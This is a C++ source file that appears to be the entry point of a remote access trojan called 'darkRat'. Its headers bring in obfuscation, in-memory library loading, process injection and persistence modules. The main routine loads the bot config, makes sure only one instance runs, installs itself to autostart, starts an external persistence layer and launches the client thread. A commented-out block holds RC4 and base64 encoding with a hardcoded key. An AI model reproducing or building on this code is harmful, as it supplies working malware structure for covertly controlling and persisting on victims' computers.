#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include <list>
#include "obfuscat.h"
#include "BuildSystem\json.h"
#include "BuildSystem\config.h"
#include <conio.h>
#include "URL.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "MemLoadLibrary.h"
#include "Helpers.hpp"
#include "OsHelpers.hpp"
#include "DarkRequest.h"
#include "XOR.h"
#include "spiderrun.h"
#include "inject.h"
#include "Client.h"
#include "persistenceLayer.h"
#include <signal.h>


#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")



#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is the "handle" to YOUR PROGRAM ITSELF.
		HINSTANCE hPrevInstance,// USELESS on modern windows (totally ignore hPrevInstance)
		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
		int iCmdShow){
#endif
	/*
	absent::crypto::RC4 rc4;

	std::string write = "FuckYea";
	std::cout << write << std::endl;
	write = rc4.crypt(write, "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>");
	write = absent::crypto::b64::encode(write.c_str());

	char* c_write = &write[0u];
	std::cout << write << std::endl;
	while (true) {
	
	}
	*/
		darkRat::config::config config = darkRat::config::load();
		//Config config;
		std::thread darkMain;

		//Check if the Bot is Running
		std::string mutex = "Local\\" + config.mutex;
		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically
		
		//Autostart  (with persistence) && Clone
		if (config.startup == "true") {
			std::string insatlled = Helpers::installedOrnot();
			if (insatlled == OBFUSCATE("restart")) {
				return 0;
			}
		}

		//Run External Persistence Object
		if (config.persistence == "true") {
			createLayer();
			startLayer();
		}

		darkMain = std::thread(Client::darkMainThread, config);
		darkMain.join();

		return 0;
}
